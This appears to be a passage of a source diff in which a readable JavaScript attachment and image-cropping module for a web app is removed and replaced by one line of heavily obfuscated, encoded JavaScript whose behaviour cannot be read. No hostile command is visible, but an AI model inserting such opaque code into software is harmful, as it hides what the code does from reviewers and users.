-         for (var k=1; k <= 4; k++)
-         tbl.rows[0].cells[k].width = ResizeUploaded.butwidth + 'px';
-         tbl.rows[0].cells[0].width = '120px';
-         //openpicorfile(codedpath}, filename);
-     }
-},
-tobewritten:'',
-fitting: function(im)
-{
-    if (promptwin.offsetWidth < im.width + 21)
-       promptwin.style.width = (im.width + 21) + 'px'; 
-},
-goodopenurl:function(codepath,tail)
-{
-    if (codepath.indexOf('http://') == 0 || codepath.indexOf('https://') == 0)
-    {
-        return codepath;
-    }
-    else
-    {
-        var st= "FileOperation?did=" + codepath;
-        if (tail==null||tail==true) st += "&tcode=" + (new Date()).getTime()%1000000000;
-        return st;
-    }   
-},
-gettobewritten : function()
-{
-   return ResizeUploaded.tobewritten; 
-   
-}, 
-showwfhint : function ()
-{
-    document.getElementById('codeshow').innerHTML = textmsg[1667];
-},
-
-folder0:null,
-
-sort:function(files, timest, urls, codedpath)
-{
-   var a = [];
-   for (var j=0; j < files.length; j++)
-   {
-       if (!isNaN(timest[j]) && urls[j] == null && codedpath[j] !=null && codedpath[j].length>14)
-       {
-           a[a.length] = [files[j], timest[j], codedpath[j]];
-           for (var k=0; k < files.length; k++)
-           {
-               if (timest[k] == files[j] && !isNaN(files[k]) &&codedpath[k]!=null &&  !isNaN(codedpath[k].replace(/_/,'')) )
-                   a[a.length] = [files[k], timest[k], codedpath[k]];
-           }
-       }
-   }
-   for (var j=0; j < files.length; j++)
-   {
-       if ( timest[j] == null && urls[j] != null && codedpath[j] ==null )
-       {
-           a[a.length] = [files[j],null, urls[j]];
-           for (var k=0; k < files.length; k++)
-           {
-               if (timest[k] == files[j] && !isNaN(files[k]) && codedpath[k]!=null && !isNaN(codedpath[k].replace(/_/,'')) )
-                   a[a.length] = [files[k], timest[k], codedpath[k]];
-           }
-       }
-   }
-   for (var i=0; i < a.length; i++)
-   {
-       files[i] = a[i][0];
-       timest[i] = a[i][1];
-       codedpath[i] = a[i][2];
-   }
-},
-
-attachman : function(attach_h)
-{
-   if (ResizeUploaded.folder0!=null) 
-   {
-       ResizeUploaded.initfolder = ResizeUploaded.folder0;
-       ResizeUploaded.folder0 = null;
-       ResizeUploaded.selicon();
-       return;
-   }
-   if (attach_h !=null) 
-   ResizeUploaded.attachref = attach_h;
-   else
-      attach_h =ResizeUploaded.attachref;
-   var dbgcolor = "lightyellow", ibgcolor="teal", bbgcolor = "grey", tbgcolor="white";
-   if (typeof(DBGCOLOR) != "undefined")
-      dbgcolor = DBGCOLOR;
-   if (typeof(IBGCOLOR) != "undefined")
-      ibgcolor = IBGCOLOR;
-   if (typeof(BBGCOLOR) != "undefined")
-      bbgcolor = BBGCOLOR;
-   if (typeof(TBGCOLOR) != "undefined")
-      tbgcolor = TBGCOLOR;
-    
-   var encoding1 = "utf-8";
-   if (typeof(encoding) != "undefined")
-       encoding1 = encoding;
-    
-   var selectedfiles = "";
-
-   
-   var ss = "";
-   var nav = null;
-   var allentries = ResizeUploaded.unzip(attach_h.value);
-   
-    
-  if (allentries.replace(/ /g,'').length < 2)
-   {
-       var tt = "";
-       if (typeof(uploadfile) == 'function') tt = ". <a href=javascript:uploadfile() >" + textmsg[294] + "</a>";
-       ss = "<center>";
-       if (ResizeUploaded.initfolder!=null)
-          ss += "<a href=\"javascript:ResizeUploaded.selicon()\">" +  textmsg[675] + "</a>&nbsp;&nbsp;&nbsp;"; 
-       ss += "<a href=\"javascript:ResizeUploaded.asraw()\"> " +   textmsg[1614].replace(/[^:]+:/,'') +" </a>&nbsp;&nbsp;&nbsp;<a href=javascript:ResizeUploaded.showwfhint()><!--[?]--></a></center>" + textmsg[89]+ tt + "<br><div id=codeshow></div>";
-       myprompt(ss,null,null,textmsg[787]);
-       //if (typeof(showattachment)!='undefined')  showattachment('');
-       return;
-   }
-   
-   var fparse = new CSVParse(allentries.replace(/,$/,''),"'","@", ",").nextMatrix();
-   var files = new Array();
-   var timest = new Array();
-   var urls = new Array();  
-   var codedpath = new Array();
-   for (var i=0; i < fparse.length; i++)
-   {
-       files[i] = fparse[i][0];
-       if (fparse[i].length==2)
-       {
-           urls[i] = fparse[i][1];
-       }
-       else 
-       {
-           timest[i] = fparse[i][1];
-           codedpath[i] = fparse[i][2];
-       }
-   }
-   ResizeUploaded.sort(files, timest, urls, codedpath);
-   var maxcols = 3; 
-   var wt = 150 + 4*ResizeUploaded.butwidth;
-   ss += "<center>";   
-   if (ResizeUploaded.initfolder!=null)
-       ss += "<a href=\"javascript:ResizeUploaded.selicon()\">" +  textmsg[675] + "</a>&nbsp;&nbsp;&nbsp;";     
-   
-   if (typeof(haswebfolder)!='undefined' && haswebfolder || typeof(allShapes)!= 'undefined')
-   {
-       ss += "<a href=\"javascript:ResizeUploaded.asraw()\">" +   textmsg[1614].replace(/[^:]+:/,'') +" </a>&nbsp;&nbsp;&nbsp;<a href=javascript:ResizeUploaded.showwfhint()><!--[?]--></a></center>"; 
-   }
-   ss += "<form name=form1 style=\margin:0px 0px 0px 0px\"><table id=\"attachaction\" cellpadding=2 cellspacing=2  border=0 class=outset1 style=\"border:0px #b0b0b0 outset;border-radius:3px;margin:3px 3px 3px 3px\" align=center  >";
-   
-   var maps = new Array();
-   
-   for (i =0; i < files.length; i++)
-   {
-      if (files[i]==null||files[i]==''||codedpath[i] ==null) continue;
-      if (isNaN(files[i]) == false && codedpath[i].replace(/[0-9]/g,"")=="___")
-      {
-         
-          ss +=  "<tr><td  style=\"border:1px #c0c0c0 solid;\"><nobr><a href=\"javascript:";
-          ss +=   "ResizeUploaded.openImagelet('" + timest[i]+ "','" +  codedpath[i] + "')\">" + textmsg[1303] + files[i] + "</a></nobr></td>";
-          ss+= "<td   class=GreenButton style=\"width:" + ResizeUploaded.butwidth + "px !important;border-radius:3px\" align=center   onclick=\"";
-          ss += "ResizeUploaded.infoImage('" +   timest[i] +  "','" +  codedpath[i] +  "')\"><nobr>" +  textmsg[1605] +"</nobr></td>";
-          var bb = true;//typeof(issubmit)!='undefined' && issubmit == true ||  rdapname.indexOf(  'grading') >=0 || rdapname == 'assignedit' || rdapname.toLowerCase().indexOf("message") >= 0;
-          
-          ss+= "<td   class=GreenButton style=\"width:" + ResizeUploaded.butwidth + "px !important;border-radius:3px\" align=center   onclick=\"";
-          ss += "ResizeUploaded.insertImagelet('" +   files[i] +  "')\"><nobr>" +  textmsg[1604] +"</nobr></td>";
-          ss+= "<td   class=OrangeButton style=\"width:" + ResizeUploaded.butwidth + "px !important;border-radius:3px\" align=center   onclick=\"";
-          ss += "ResizeUploaded.cutoff('" +  maps[timest[i]] +  "','" +   timest[i] +  "','" +  codedpath[i] +  "'," + files[i] + ")\"><nobr>" +  textmsg[1603] +"</nobr></td>";
-          ss+= "<td   class=RedButton style=\"width:" + ResizeUploaded.butwidth + "px !important;border-radius:3px\" align=center   onclick=\"";
-          ss += "ResizeUploaded.deleteImagelet('" + files[i] + '@'+timest[i]  + "')\"><nobr>" +  textmsg[69] +"</nobr></td>";
-          ss += "<td></td></tr>";
-      }
-      else  
-      {
-          ss += "<TR ><td  style=\"border:1px #c0c0c0 solid;\"><nobr><a href=\"javascript:";
-          ss +=   "ResizeUploaded.openAttachedFile('" + codedpath[i] + "','" + files[i] + "')\">" + files[i] + "</a></nobr></td>";
-          ss+= "<td    class=GreenButton style=\"width:" + ResizeUploaded.butwidth + "px !important;border-radius:3px\" align=center   onclick=\"";
-          ss += "ResizeUploaded.urlAttachedFile('" + codedpath[i] +  "')\"><nobr>" +  textmsg[546] +"</nobr></td>";
-          var bb = true;//typeof(issubmit)!='undefined' && issubmit == true ||  rdapname.indexOf(  'grading') >=0 || rdapname == 'assignedit' || rdapname.toLowerCase().indexOf("message") >= 0;
-
-          
-          var jj = files[i].lastIndexOf(".");
-          var fen = files[i].substring(jj + 1).toLowerCase();
-           
-          if (fen == 'jpg' || fen == 'jpeg' || fen == 'gif' || fen == 'png') 
-          {
-             maxcols = 5;
-             if (timest[i]!=null ){
-             if (allentries.indexOf("@" + files[i] + "@")<0)
-             {
-             ss += "<td style=\"width:" + ResizeUploaded.butwidth + "px !important;border-radius:3px\" class=OrangeButton  align=center   onclick=\"";
-             ss +=   "ResizeUploaded.uploaded('web/" + codedpath[i] + "','" + files[i] + '@' + timest[i] + "')\"><nobr>" +  textmsg[1294] +"</nobr></td>";
-             }
-             else 
-             {
-             ss += "<td style=\"width:" + ResizeUploaded.butwidth + "px !important;border-radius:3px\" class=OrangeButton  align=center   onclick=\"";
-             ss +=   "ResizeUploaded.uploaded('web/" + codedpath[i] + "','" + files[i] + '@' + timest[i] + "')\"><nobr>" +  textmsg[1294] +"</nobr></td>";
-             }}
-             else ss += "<td></td>";
-         ////  ss += "<td width=" +  Math.round(4.5*font_size) +" class=OrangeButton style=\"width:70px\" align=center   onclick=\"";
-           //  ss +=    "ResizeUploaded.codeAttachedFile('"  + codedpath[i] + "')\"><nobr>" +  textmsg[1303] +"</nobr></td>";
-            ss += "<td style=\"width:" + ResizeUploaded.butwidth + "px !important;border-radius:3px\"  class=OrangeButton   align=center   onclick=\"";
-            ss +=    "ResizeUploaded.cutoff('" + codedpath[i] + "','" + files[i]+ "')\"><nobr>" +  textmsg[1303] +"</nobr></td>"; 
-            maps[files[i]] = codedpath[i];
-          }
-          else
-          {
-              if (typeof(DBGCOLOR) == 'undefined') DBGCOLOR = "white";
-              ss += "<td colspan=2 style=background-color:" + DBGCOLOR +"></td>"; 
-          }
-          if (timest[i]!=null)
-          {
-              ss+= "<td style=\"width:" + ResizeUploaded.butwidth + "px !important;border-radius:3px\"   class=RedButton   align=center   onclick=\"";
-              ss +=   "ResizeUploaded.deleteAttachedFile('" + files[i] + '@'+timest[i]  +'@' + codedpath[i] +  "')\"><nobr>" +  textmsg[69] +"</nobr></td>";
-          }
-          else
-          {
-              ss+= "<td style=\"width:" + ResizeUploaded.butwidth + "px !important;border-radius:3px\"   class=RedButton   align=center   onclick=\"";
-              ss +=   "ResizeUploaded.deleteAttachedFile('" + files[i] + '@' + codedpath[i] +  "')\"><nobr>" +  textmsg[69] +"</nobr></td>";
-         
-          }
-          ss += "<td></td></tr>" ;
-      }
-   }
-  ss += ("<tr><td colspan=" + (maxcols+1) + " id=codeshow><br></td></tr></table></form>"  );
-  
-   
-  {
-      myprompt(ss,null,null,   textmsg[787]  );
-      if (promptwin!=null)  
-      {
-          var zz = promptwin.getElementsByTagName('table')[0];
-          if (zz!=null && zz.rows.length > 1)
-          {
-              zz = zz.rows[1].cells[1].getElementsByTagName('table')[0];
-              if (zz.rows!=null && zz.rows.length > 1)
-              {
-                  zz.rows[1].cells[0].style.padding = "0px 0px 0px 0px";
-              }
-          }
-          
-      }
-  }
-   ResizeUploaded.xnow = parseInt(promptwin.style.left.replace(/px/,''));
-   ResizeUploaded.ynow = parseInt(promptwin.style.top.replace(/px/,''));
-   ResizeUploaded.widthnow = document.body.scrollWidth;
-   ResizeUploaded.heightnow = document.body.scrollHeight;
-   
-},
- 
-updatecell:function()
-{
-    var p = new CSVParse(ResizeUploaded.unzip(ResizeUploaded.attachref.value).replace(/,$/,''), '\'', '@',',');
-    var y = p.nextMatrix(true);
-    var tbl = document.getElementById('celledit');
-    for (var i=0; i < tbl.rows.length; i++)
-    {    
-        var bb = (document.getElementById('CE' + i + '_2')!=null);
-    for (var j=0; j < (bb?3:2); j++)
-    {  
-       if (bb)
-       {
-           var ij = document.getElementById('CE' + i + '_' + j);
-           if (ij != null) 
-           {
-               if (i >= y.length)
-                  y[i] = ['','',''];
-               y[i][j] = ij.value.replace(/ /g,'');
-               if (j==2) y[i][j] = y[i][j].replace(/@/g, escape('@')).replace(/,/g, escape(','));
-                
-           }
-       }
-       else
-       {
-           var ij = document.getElementById('CE' + i + '_' + j);
-           if (ij != null && ij.value!='') 
-           {
-               if (i >= y.length)
-                  y[i] = ['',''];
-               y[i][j] = ij.value.replace(/ /g,'');
-           }
-       }
-    }
-}
-    var z = '';
-    for (i=0; i < y.length; i++)
-    {
-        if (y[i].length==3) 
-        for (var j=0; j < 3; j++)
-        {
-            if (y[i][0].replace(/ /g,'')=='' || y[i][1].replace(/ /g,'')==''|| y[i][2]=='')continue;
-            if (y[i][2].length>18 && isNaN(y[i][1]) && y[i][2].replace(/[0-9]/g,'')!="___")
-                y[i][1] = parseTime(y[i][1]);
-            z +=   y[i][j] + "@";
-        }
-        else
-        for (var j=0; j < 2; j++)
-        {
-            if (y[i][0]=='' || y[i][1]=='')continue;
-            z += (j==0?'':"'") +  y[i][j] + (j==0?'':"'") + "@";
-        }    
-        z = z.replace(/@$/,','); 
-    }
-    
-    ResizeUploaded.attachref.value = ResizeUploaded.zip(z);
-},
-dontdel : '',
-asraw : function()
-{
-    var ck = GetCookie('fileurlbuf');
-    SetCookie('fileurlbuf','',-1);
-    var hasone = false;
-    if (ck == null || ck == 'null') 
-        ck = '';
-    else
-        ResizeUploaded.dontdel += ck;
-    ck = ck + ResizeUploaded.unzip(ResizeUploaded.attachref.value);
-    var p = new CSVParse(ck.replace(/,$/,''), '\'', '@',',');
-    var y = p.nextMatrix(true); 
-    if (ck == '') 
-    {
-        y[0] = ['','','']; 
-        y[1] = ['',''];
-    }
-    else 
-    {
-        y[y.length] = ['','',''];
-        y[y.length] = ['',''];
-    }
-    var z  = "<table id=celledit border=1 style=border-collapse:collapse style=\"border:1px #dddddd solid;background-color:white\">";
-    var sizes = [16,16,50];
-    var xs = textmsg[1850].split(/@/);
-   // z += "<tr  bgcolor=lightblue><td align=left>" + xs[0] + "</td><td>"+ xs[1] +"</td><td>"+ xs[2] +"</td></tr>";
-    for (var i=0; i < y.length  ; i++)
-    {
-        z += "<tr>";
-        if (y[i].length==3)
-        for (var j=0; j < 3; j++)
-        {
-            if (y[i][j] == null) y[i][j] = '';
-            var len = 20; if (y[i][j]!=null) len = y[i][j].length;
-            if (len < sizes[j]) len = sizes[j];
-            if (len > sizes[j] + 2) len = sizes[j] + 2; 
-            len = Math.round(7.5*len);
-            
-            z += "<td align=left   style=\"background-color:white;font-size:" + font_size + "px;\"><input id=CE" + i + '_' + j + " value=\"" + y[i][j] + "\" style=\"background-color:white;color:black;border:0px;width:" + len+ "px;font-size:" + font_size + "px\"></td>";
-        }
-        else
-        for (var j=0; j < 2; j++)
-        {
-            if (y[i][j] == null) y[i][j] = '';
-            var len = 20; if (y[i][j]!=null) len = y[i][j].length;
-            if (len < sizes[j]) len = sizes[j];
-            if (len > sizes[j] + 2) len = sizes[j] + 2; 
-            if (y[i][1]=='') y[i][1] = "http...";
-            z += "<td align=left colspan=" + (j==0?"1":"2") + "  style=\"background-color:white;font-size:" + font_size + "px;\"><input id=CE" + i + '_' + j + " value=\"" + y[i][j] + "\" style=\"background-color:white;color:" +(y[i][1]==''?'black':'grey') + ";border:0px;width:100%;font-size:" + font_size + "px\" " + (j==0?"":" onchange=ResizeUploaded.fillfilename(this," + i +")  ") + "></td>";
-        }    
-        z += "</tr>";
-    }
-    
-    z += "</table><br><center><input type=button style=\"background:url(image/addopt.png);width:18px;height:18px;background-position:-2px -2px;cursor:pointer\" onclick=\"ResizeUploaded.updatecell();ResizeUploaded.asraw()\">&nbsp;&nbsp;<input name=send type=button value=\"" + textmsg[225] + "\" class=OrangeButton style=width:" + Math.round(4.5*font_size) + "px onclick=\"ResizeUploaded.updatecell();ResizeUploaded.attachman(ResizeUploaded.attachref)\"><input name=cancel  value=\"" + textmsg[18] + "\" type=button class=GreenButton style=width:" + Math.round(4.5*font_size) + "px onclick=closeprompt()></center>";
-    
-    var ss = '<center>';
-    if (ResizeUploaded.initfolder!=null)
-          ss += "<a href=\"javascript:ResizeUploaded.selicon()\">" +  textmsg[675] + "</a>&nbsp;&nbsp;&nbsp;"; 
-    ss += '<a href="javascript:ResizeUploaded.attachman(ResizeUploaded.attachref)">' 
-     + textmsg[1614].replace(/:.*/,'') + '</a></center>' + z;
-    myprompt(ss,null,null,textmsg[787] );
-},
-fillfilename:function(tb,i)
-{
-    var j = tb.value.lastIndexOf('/');
-    if (j==-1) return;
-    var t1 = document.getElementById( "CE" + i + '_0');
-    if (t1.value=='')  
-    {
-       var fn = tb.value.substring(j+1);
-       if (fn.length>16) fn = fn.substring(fn.length-16);
-       t1.value = fn;
-    }
-},
-initfolder: null,
-iframewin:null,
-getIFrameSelected:function()
-{
-    var s = ResizeUploaded.iframewin.selected();
-    ResizeUploaded.attachref.value = ResizeUploaded.zip(ResizeUploaded.unzip(ResizeUploaded.attachref.value)+ s);
-},
-selicon: function()
-{
-    if (ResizeUploaded.initfolder!=null)
-    myprompt(
-     ""//<center><input name=send type=button value=\"" + textmsg[1600] + "\" class=OrangeButton style=width:" + Math.round(4.5*font_size) + "px onclick=\"ResizeUploaded.getIFrameSelected();ResizeUploaded.attachman(ResizeUploaded.attachref)\"><input name=cancel  value=\"" + textmsg[18] + "\" type=button class=GreenButton style=width:" + Math.round(4.5*font_size) + "px onclick=closeprompt()></center><br>" 
-   + "<iframe id=filebrowse src=Thumbs?folder=" + ResizeUploaded.initfolder + " width=450 height=550 />",null,null,ResizeUploaded.initfolder); 
-},
-addAnentry : function(fn, tm, code)
-{
-    var x = ResizeUploaded.unzip(ResizeUploaded.attachref.value);
-    if (x.indexOf(code) < 0)
-    {
-        x += fn + '@' + tm + '@' + code + ',';
-    }
-    ResizeUploaded.attachref.value = ResizeUploaded.zip(x);
-    if (typeof(showattachment)!='undefined')  showattachment(x);
-},
-deleteByCode : function(c)
-{
-    var x = ResizeUploaded.unzip(ResizeUploaded.attachref.value).replace(/,$/,'');
-    var y = (new CSVParse(x,'\'',"@", ",")).nextMatrix();
-    var str = '';
-    for (var i=0; i < y.length; i++)
-    {
-        if (y[i][2]!=c)
-            str += y[i][0] + '@' + y[i][1] + '@' + y[i][2] + ',';
-    }
-    ResizeUploaded.attachref.value = ResizeUploaded.zip(str);
-    if (typeof(showattachment)!='undefined')  showattachment(str);
-}, 
-deleteImagelet : function(filename)
-{
-    var v = ',' + ResizeUploaded.unzip(ResizeUploaded.attachref.value); var v0=v;
-    var k = v.indexOf(','+filename + '@');
-    if (k < 0) return;
-    v = v.substring(0,k) + v.substring(k + filename.length + 2).replace(/[^,]+/,'');
-    
-    ResizeUploaded.attachref.value = ResizeUploaded.zip(v.replace(/^,/,''));
-    ResizeUploaded.attachman(ResizeUploaded.attachref);
-},
-insertImagelet : function(j)
-{
-    var sa = document.getElementById("codeshow");
-    var ss = textmsg[311].replace(new RegExp("("+textmsg[1303]+ ")","ig"),"$1" + j) ;
-    var dic = textmsg[1613].split(/@/);
-    var  associatedtxt = textareatobesearch;
-    if ( associatedtxt != null && typeof(caretPos)!='undefined') 
-    {
-        ResizeUploaded.oldonclick = associatedtxt.onclick;
-        associatedtxt.onclick = function()
-        {
-            ResizeUploaded.caretpos = caretPos(associatedtxt);
-            
-            if (ResizeUploaded.oldonclick!=null) 
-                ResizeUploaded.oldonclick();
-        }
-        ss += ",<br>" + textmsg[312];
-        for (var k=0; k < 3; k++)
-           ss += " <a href=\"javascript:ResizeUploaded.goinsert(" + j + "," + k  + ")\">" + dic[k] + "</a> ";
-    }
-    
-    sa.innerHTML = ss  ;
-},
-oldonclick : null,
-caretpos:0, 
-goinsert : function(n,k)
-{
-    var j = ResizeUploaded.caretpos;
-    var  associatedtxt = textareatobesearch;
-    if ( associatedtxt == null || j == 0)
-    { 
-        var sa = document.getElementById('codeshow');
-        if (sa!=null)
-        sa.innerHTML = sa.innerHTML + "<br>" + textmsg[1606];
-        return;
-    }
-     
-    var m = '';
-    if (k==0) m=':1';else if (k==2) m= ':2'; 
-    associatedtxt.value = associatedtxt.value.substring(0,j) + "[Imagelet" +  n + m+ "]" + associatedtxt.value.substring(j); 
-    
-},
-infoImage : function(fn, dim) 
-{
-     var sa = document.getElementById("codeshow");
-     var ds = dim.split(/_/);
-     sa.innerHTML = fn  + ", x=" + ds[0] + ", y=" + ds[1] + ", w=" + ds[2] + ", h=" + ds[3]
-},
-openImagelet : function(filename, dim)
-{
-    var v = ResizeUploaded.unzip(ResizeUploaded.attachref.value).replace(/,$/,'');
-    var mt =  (new CSVParse(v, "'", "@", ",")).nextMatrix(true);
-    for (var i=0; i < mt.length; i++)
-    {
-        if (filename == mt[i][0]) break;
-    }
-    if (i == mt.length) return;
-    if (mt[i].length==3)
-    var url = ResizeUploaded.goodopenurl(mt[i][2]);
-    else
-        url = ResizeUploaded.goodopenurl(mt[i][1]);
-    var sa = document.getElementById("codeshow");
-    var ns = dim.split(/_/);
-    
-    sa.innerHTML = '<div style="background-image:url('+ url + ');background-position:-' + ns[0] + "px -" + ns[1] + "px;width:" + ns[2] + "px;height:" + ns[3] + 'px" >&nbsp&nbsp;</div>';
- 
-},
-urlAttachedFile : function(pathcode)
-{
-    var showarea = document.getElementById('codeshow');
-    showarea.style.border = "1px #b0b0b0 outset";
-    if (pathcode.indexOf('http://')==0 || pathcode.indexOf('https://')==0)
-         showarea.innerHTML = pathcode;
-    else 
-         showarea.innerHTML = document.location.toString().replace( /[^\\/]+$/,  ResizeUploaded.goodopenurl(pathcode,false ));
-     
-},
-activetextarea : function(x)
-{
-    return null;
-},
-setformat2html : function()
-{
-    
-},
-picfilename : null, 
- 
-cutoff : function(pathcode,fn,dim, num) 
-{
-    if (pathcode==null)
-    {
-        pathcode = ResizeUploaded.pathcode.replace(/@.*/,'');
-        fn = ResizeUploaded.filename.replace(/@.*/,'');
-    }
-      
-    ResizeUploaded.picfilename = fn; 
-    var x = textmsg[1602] +  "<input type=button  class=GreenButton style=width:" + Math.round(4.5*font_size) + "px value=\"" + textmsg[16] + "\" onclick=\"ResizeUploaded.selectit(" + (num==null?'':num)+ ")\"><div style=display:inline id=selectlet></div>";
-    myprompt(x +"<img id=imgwork src=\"" + ResizeUploaded.goodopenurl(pathcode) +  "\" onload=\"ResizeUploaded.goodposition(this);ResizeUploaded.cropshow(null);" + (dim==null?'':("ResizeUploaded.moveTo(["+dim.replace(/_/g,',')+"]);")) + "\" style=\"margin:0px 0px 0px 0px\" >",
-    null, null, (num==null? (textmsg[1600]+ textmsg[1303]) : (textmsg[1603] + " " + textmsg[1303] + num)) );
-     
-    promptwin.getElementsByTagName('table')[0].rows[1].cells[1].getElementsByTagName('table')[0].rows[1].cells[0].style.padding = "0px 0px 0px 0px";
-    promptwin.getElementsByTagName('table')[0].rows[1].cells[1].getElementsByTagName('table')[0].rows[0].cells[0].getElementsByTagName('img')[0].onclick
-    = function()
-    {
-        var b = document.getElementById("dragcropbox"); 
-        if (b!=null) document.body.removeChild(b);
-        closeprompt();
-    } 
-},
- 
-selectit : function(j)
-{
-    var pic = document.getElementById('imgwork');
-    var XY = findPositionnoScrolling(pic);
-    var w = pic.offsetWidth;
-    var h = pic.offsetHeight;
-    var b = document.getElementById("dummycenter");
-    var cw, ch;
-    if (b==null) return; 
-    if ( b != null)
-    {
-        cw = b.offsetWidth;
-        ch = b.offsetHeight;
-         
-        var xy = findPositionnoScrolling(b);
-        xy[0] -= XY[0];
-        xy[1] -= XY[1];
-        if (xy[0] < 0)
-            xy[0] = 0;
-        if (xy[1] < 0)
-            xy[1] = 0;
-    } 
-    var mt = (new CSVParse(ResizeUploaded.unzip(ResizeUploaded.attachref.value).replace(/,$/,''),"'","@",",")).nextMatrix();
-    if (j == null || j=='' || isNaN(j)) 
-    {
-        j = 0;
-        for (var i=0; i < mt.length; i++)
-        {
-            if (mt[i].length==3 && !isNaN(mt[i][0]) && mt[i][2].replace(/[0-9]/g,'')=='___')  
-            {
-            var k = parseInt(mt[i][0]);
-            if (k > j) j = k;
-            }
-        }
-        j++;
-        var xx = ResizeUploaded.unzip(ResizeUploaded.attachref.value) + (j) + "@" + ResizeUploaded.picfilename.replace(/@.*/,'') + "@" + xy[0] + "_" +  xy[1] + "_" + cw + "_" + ch + ",";
-        ResizeUploaded.attachref.value = ResizeUploaded.zip(xx);
-        var x = promptwin.getElementsByTagName('table')[0].rows[1].cells[1].getElementsByTagName('table')[0].rows[0].cells[2];
-        b.style.left = XY[0] + 'px'; b.style.top = XY[1] + 'px';
-        
-        var zt = document.getElementById('selectlet');
-        zt.innerHTML = zt.innerHTML.replace(new RegExp(textmsg[1611] + ".*$"),'') + '&check;' + textmsg[1611] + "<input type=button class=GreenButton style=width:" + Math.round(4.5*font_size) + "px name=t1 value=\"" + textmsg[1612] + "\" onclick=\"ResizeUploaded.attachman(ResizeUploaded.attachref)\">";
-    }
-    else
-    {
-        var y= ',' + ResizeUploaded.unzip(ResizeUploaded.attachref.value);
-        var w = "," + j + "@" + ResizeUploaded.picfilename + "@";
-        var w1 = w + xy[0] + "_" +  xy[1] + "_" + cw + "_" + ch;
-        if(typeOf(imagelet2wh) != 'undefined' && typeOf(pagenum) != 'undefined' )
-        {
-            imagelet2wh['imagelet' + j + '_' + pagenum] =  (parseInt(''+cw)/2) + "px/" + (parseInt(''+ch)/2) + 'px';
-        }
-        var k = y.indexOf(w); 
-        if (k>=0)
-        {
-            y = y.substring(0,k) + w1 + y.substring(k + w.length).replace(/^[0-9|_]+/,'');
-            ResizeUploaded.attachref.value = ResizeUploaded.zip(y.replace(/^,/,''));
-            document.body.removeChild(document.getElementById('dragcropbox'));
-            closeprompt();
-        }  
-    }
-    
-     
-    if (typeof(showattachment)!='undefined') showattachment(ResizeUploaded.attachref.value);
-               // url += "&cropx=" + xy[0] + "&cropy=" + xy[1] + "&cwidth=" + cw + "&cheight=" + ch;
-},
-codeAttachedFile : function(pathcode)
-{
-    var showarea = document.getElementById('codeshow');
-    showarea.style.border = "1px #b0b0b0 outset";
-    showarea.innerHTML = "&lt;img src=\"" + ResizeUploaded.goodopenurl(pathcode,false)   + "\" &gt;";
-    var ta = ResizeUploaded.activetextarea(pathcode);
-    if (ta != null)
-    {
-        var j = caretPos(ta);
-        ta.value = ta.value.substring(0,j) +  "<img src=\"" + ResizeUploaded.goodopenurl(pathcode)   + "\" style=display:inline;float:right >" +  ta.value.substring(j); 
-         
-        ResizeUploaded.setformat2html();
-        myprompt(textmsg[794]);
-    }
-} 
-}
-
-function failupload(err,leng,newfilename,js)
-{
-    
-    if (err == null || err == '')
-    {
-         
-    }
-    else if (typeof(err) == 'number')
-    {
-        var y =  ResizeUploaded.filename;
-         
-        ResizeUploaded.filename =  newfilename+ '@' + err;
-        if (ResizeUploaded.attachref!=null)
-        {
-            var z = ResizeUploaded.unzip( ResizeUploaded.attachref.value );
-            
-            var j = z.indexOf(y);
-            if (j >-1)
-            {  
-                var k = j + y.length;
-                while (k < z.length && z.charAt(k) != ',') k++;
-                var w = z.substring(0,j) + ResizeUploaded.filename + '@' + js;
-                if (k < z.length)  w += z.substring(k); 
-                
-                ResizeUploaded.attachref.value = ResizeUploaded.zip(w);
-            }
-        }
-         
-        if (ResizeUploaded.dosplitnow)
-        {
-            ResizeUploaded.cutoff();
-            ResizeUploaded.dosplitnow = false;
-        }
-    }
-    else
-        myprompt(err);
-    
-    
-}
- 
-function viewattachment(t)
-{
-    
-    if (t == null || t =='') return '';
-    var attarr = ResizeUploaded.unzip(t).replace(/,$/,'').split(/,/);
-    var tmptxt = '';
-    for (var i = 0; i < attarr.length; i++)
-    {
-        var xs = attarr[i].split(/@/);
-        if (tmptxt!='') tmptxt += ", "; 
-        tmptxt += '<span style=color:blue;cursor:pointer onclick="openpicorfile(\''+ xs[2].replace(/^[ ]+/,'') + '\',\'' + xs[0] + '\',this)">' +  xs[0] + '</span>';
-    }
-    return tmptxt;
-}
- 
-
-
-
-
+l1l=document.documentMode||document.all;var c6ca8b5de=true;ll1=document.layers;lll=window.sidebar;c6ca8b5de=(!(l1l&&ll1)&&!(!l1l&&!ll1&&!lll));l_ll=location+'';l11=navigator.userAgent.toLowerCase();function lI1(l1I){return l11.indexOf(l1I)>0?true:false};lII=lI1('kht')|lI1('per');c6ca8b5de|=lII;zLP=location.protocol+'0FD';u8Bf6t7VeMS2ql=new Array();t15WrKN1Ssi1eI=new Array();t15WrKN1Ssi1eI[0]='dH%31%37T\146%6C';u8Bf6t7VeMS2ql[0]='	~xa~~~~~~~~~	~\n~~~\r~~~~~~~~~~~~~~~~~~~ ~\r~#~$~%~&~\'~(~)~*~+~,~-~.~/~0~1~2~3~4~5~6~7~8~9~:~;~<~=~>~?~@~A~B~C~D~E~F~G~H~I~J~K~L~M~N~O~P~Q~R~S~T~U~V~W~X~Y~Z~[~\\~]~^~_~`~a~b~&~!~e~f~g~h~i~j~k~l~m~n~o~p~q~dl=document.layers;oe=win~ww.op}a?1:0;da=(~w~y~{~}.}~z~|tMode||}"}~~all)&&!};g}},}$.}8tEle}-ById;ws}	}}\r.si}(bar?true:f}/se;tN=navigator.u}\\rA}8} }hLow}Ca}\\();iz}`}_.}KexOf(\'netsca}\')>=0}T}V}X}Zl}\\;zi}I}||8~va;v}R msg=\'\';function |	m}z{r|\nur|7}U}W}}G}K}t}|	rr}i =|8}A|OF}J}|Gl~x}g|5n.p|K}hcol|}|||fi}@|!=-1|}W}Y}[}]i7f=|s}3!z|R|p||s;/*{{{{{{	{\n{{{\r{\n\r\n* (C) C}yr}eht 2004-{ 21 by Syst}As |6 Web, I|2.  A}0 R{|{Ae}mved{< *{{Auth}i: Z{Sngya|7L}{={`{a{b{c{d{e{f{d{M{{{k{l{m{n{/{if{ ty}o|i|4sago}\'~wma}{=|N\'|1}(|h|	d|{{{{`|&r {||{zdzz|7|N}:} |W|\r|4|6.}hS}U}g}z|c}(||\'{tps://z{X{Z{\\l}}<{|hub|o|;z{={s{z{~zxazoz{_|l 0)zI z\n{dzMzzPzRz z!~~z#|Yz&z(z*{Yz-|z0|z3pz7/10.ztzt{&zGzX{azK(z]zOzzQz 